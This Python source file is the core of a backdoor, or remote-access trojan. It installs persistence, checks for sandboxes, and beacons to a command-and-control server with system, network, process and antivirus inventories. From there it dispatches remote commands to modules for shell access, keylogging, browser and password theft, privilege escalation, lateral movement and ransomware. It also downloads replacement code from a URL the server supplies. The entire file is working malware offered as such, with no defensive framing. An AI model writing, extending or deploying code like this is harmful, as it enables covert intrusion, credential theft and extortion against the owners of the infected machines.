"""
Main backdoor implementation coordinating all components.
"""
import time
import random
import platform
import os
import psutil
import socket
import json
from datetime import datetime

from config import Config
from communication.manager import CommunicationManager
from persistence.manager import PersistenceManager
from stealth.manager import StealthManager
from modules.manager import ModuleManager


class AdvancedBackdoor:
    """Main backdoor class"""

    def __init__(self):
        self.comm = CommunicationManager()
        self.modules = ModuleManager()
        self.running = True
        self.last_beacon = 0

        # Install persistence
        print("[*] Installing persistence...")
        if PersistenceManager.install():
            print("[+] Persistence installed successfully")
        else:
            print("[-] Persistence installation failed")

        # Check environment
        print("[*] Checking environment...")
        if not StealthManager.check_environment():
            print("[!] Environment check failed - exiting")
            self.running = False
        else:
            print("[+] Environment check passed")

    def run(self):
        """Main backdoor loop"""

        print("[*] Starting backdoor...")

        while self.running:
            try:
                # Calculate beacon interval with jitter
                interval = Config.BEACON_INTERVAL * (1 + random.uniform(-Config.JITTER, Config.JITTER))
                time.sleep(interval)

                # Collect system info
                system_info = self._collect_system_info()

                # Send beacon
                response = self.comm.send(system_info)

                if response:
                    self._process_command(response)

            except KeyboardInterrupt:
                print("[*] Received interrupt signal")
                break
            except Exception as e:
                print(f"[!] Backdoor error: {e}")
                time.sleep(60)  # Wait before retrying

        print("[*] Backdoor stopped")

    def _collect_system_info(self) -> dict:
        """Collect comprehensive system information"""

        info = {
            'hostname': platform.node(),
            'os': platform.platform(),
            'architecture': platform.architecture(),
            'processor': platform.processor(),
            'python_version': platform.python_version(),
            'user': os.getlogin() if hasattr(os, 'getlogin') else 'unknown',
            'pid': os.getpid(),
            'cwd': os.getcwd(),
            'timestamp': datetime.now().isoformat(),
            'network': self._get_network_info(),
            'processes': self._get_process_list(),
            'disks': self._get_disk_info(),
            'antivirus': self._check_antivirus()
        }

        return info

    def _get_network_info(self) -> dict:
        """Get network information"""

        network = {
            'interfaces': [],
            'connections': []
        }

        try:
            # Get network interfaces
            interfaces = psutil.net_if_addrs()
            for name, addrs in interfaces.items():
                interface_info = {'name': name, 'addresses': []}
                for addr in addrs:
                    interface_info['addresses'].append({
                        'family': str(addr.family),
                        'address': addr.address,
                        'netmask': addr.netmask,
                        'broadcast': addr.broadcast
                    })
                network['interfaces'].append(interface_info)

            # Get network connections
            connections = psutil.net_connections()
            for conn in connections[:10]:  # Limit to first 10
                network['connections'].append({
                    'fd': conn.fd,
                    'family': str(conn.family),
                    'type': str(conn.type),
                    'laddr': str(conn.laddr) if conn.laddr else None,
                    'raddr': str(conn.raddr) if conn.raddr else None,
                    'status': conn.status
                })

        except Exception as e:
            network['error'] = str(e)

        return network

    def _get_process_list(self) -> list:
        """Get list of running processes"""

        processes = []

        try:
            for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent']):
                try:
                    processes.append({
                        'pid': proc.info['pid'],
                        'name': proc.info['name'],
                        'username': proc.info.get('username', 'unknown'),
                        'cpu_percent': proc.info.get('cpu_percent', 0),
                        'memory_percent': proc.info.get('memory_percent', 0)
                    })
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue

            # Return only first 10 processes
            return processes[:10]

        except Exception as e:
            return [{'error': str(e)}]

    def _get_disk_info(self) -> list:
        """Get disk information"""

        disks = []

        try:
            partitions = psutil.disk_partitions()
            for partition in partitions:
                try:
                    usage = psutil.disk_usage(partition.mountpoint)
                    disks.append({
                        'device': partition.device,
                        'mountpoint': partition.mountpoint,
                        'fstype': partition.fstype,
                        'total': usage.total,
                        'used': usage.used,
                        'free': usage.free,
                        'percent': usage.percent
                    })
                except:
                    disks.append({
                        'device': partition.device,
                        'mountpoint': partition.mountpoint,
                        'fstype': partition.fstype,
                        'error': 'Could not get usage info'
                    })

        except Exception as e:
            disks.append({'error': str(e)})

        return disks

    def _check_antivirus(self) -> list:
        """Check for antivirus software"""

        av_list = []

        # Common AV processes
        av_processes = [
            'MsMpEng.exe', 'avp.exe', 'bdagent.exe', 'mbam.exe',
            'avastui.exe', 'avgui.exe', 'SophosUI.exe', 'mcafee.exe'
        ]

        try:
            for proc in psutil.process_iter(['name']):
                proc_name = proc.info['name'].lower()
                for av_proc in av_processes:
                    if av_proc.lower() in proc_name:
                        av_list.append(proc_name)
                        break

        except Exception as e:
            av_list.append(f'Error checking AV: {str(e)}')

        return av_list

    def _process_command(self, response: dict):
        """Process command from C2"""

        if 'command' not in response:
            return

        command = response['command']
        args = response.get('args', {})

        print(f"[*] Executing command: {command}")

        result = {}

        if command == 'shell':
            result = self.modules.execute('shell', args)
        elif command == 'file':
            result = self.modules.execute('file_manager', args)
        elif command == 'screenshot':
            result = self.modules.execute('screenshot', args)
        elif command == 'keylogger':
            result = self.modules.execute('keylogger', args)
        elif command == 'browser':
            result = self.modules.execute('browser_stealer', args)
        elif command == 'passwords':
            result = self.modules.execute('password_dumper', args)
        elif command == 'scan':
            result = self.modules.execute('network_scanner', args)
        elif command == 'privesc':
            result = self.modules.execute('privilege_escalation', args)
        elif command == 'lateral':
            result = self.modules.execute('lateral_movement', args)
        elif command == 'ransomware':
            result = self.modules.execute('ransomware', args)
        elif command == 'kill':
            print("[*] Kill command received")
            self.running = False
            result = {'success': True, 'message': 'Backdoor terminating'}
        elif command == 'update':
            result = self._update_backdoor(args.get('url', ''))
        elif command == 'uninstall':
            result = self._uninstall()
        else:
            result = {'error': f'Unknown command: {command}'}

        # Send result back if we have one
        if result:
            self.comm.send({'result': result})

    def _update_backdoor(self, url: str) -> dict:
        """Update backdoor from URL"""

        try:
            import urllib.request

            print(f"[*] Updating from: {url}")
            with urllib.request.urlopen(url) as response:
                new_code = response.read()

            # Write new code to temporary file
            temp_path = os.path.join(os.getcwd(), 'backdoor_new.py')
            with open(temp_path, 'wb') as f:
                f.write(new_code)

            return {'success': True, 'message': 'Update downloaded, restart required'}

        except Exception as e:
            return {'error': f'Update failed: {str(e)}'}

    def _uninstall(self) -> dict:
        """Uninstall backdoor"""

        try:
            print("[*] Uninstalling backdoor...")

            # TODO: Remove persistence mechanisms
            # TODO: Clean up files
            # TODO: Remove scheduled tasks/services

            self.running = False

            return {'success': True, 'message': 'Uninstall scheduled'}

        except Exception as e:
            return {'error': str(e)}